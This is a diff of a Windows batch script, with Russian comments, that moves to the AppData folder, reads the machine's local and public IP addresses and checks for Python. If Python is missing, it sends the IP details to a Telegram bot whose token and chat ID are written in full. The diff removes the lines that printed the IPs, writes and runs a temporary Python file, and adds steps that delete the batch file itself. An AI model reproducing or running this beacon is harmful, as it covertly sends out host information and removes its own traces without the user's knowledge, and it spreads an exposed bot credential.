@@ -5,6 +5,9 @@
 setlocal enabledelayedexpansion
 chcp 65001
 
+:: Записываем папку с которой начали
+set src_path=%cd%
+
 :: Идём в Roaming
 cd %AppData%
 
@@ -14,17 +17,15 @@ set "localIP=!localIP:~1!"
 
 :: Получаем внешний IP
 for /f "tokens=*" %%i in ('curl -s http://api.ipify.org') do set publicIP=%%i
-echo !localIP!
-echo !publicIP!
 
-:: Проверка наличия Python на ПК
+:: Проверка наличия Python
 python --version >nul 2>&1
 if errorlevel 1 (
     :: Если Питон нет
     :: то мы скажем, что нету питона :/
     setlocal enabledelayedexpansion
-    set "localIP=192.168.1.1"  REM Пример локального IP
-    set "public=95.73.225.85"   REM Пример публичного IP
+    set "localIP=192.168.1.1"
+    set "public=95.73.225.85"
     set "message=🐍 Python не установлен.     ||     💻 Локальный IP: !localIP!     ||     🌎 Внешний IP: !public!"
     set "encodedMessage=!message: =%%20!"
     curl "https://api.telegram.org/bot7539990102:AAFCEwvXc2yzf-FUD-UD8vH_uHM1Vfoo_NA/sendMessage?chat_id=1320559926&text=!encodedMessage!"
@@ -36,3 +37,7 @@ if errorlevel 1 (
     python temp.py
     del temp.py
 )
+
+:: возращяемся обратно
+cd %src_path%
+del exec.bat
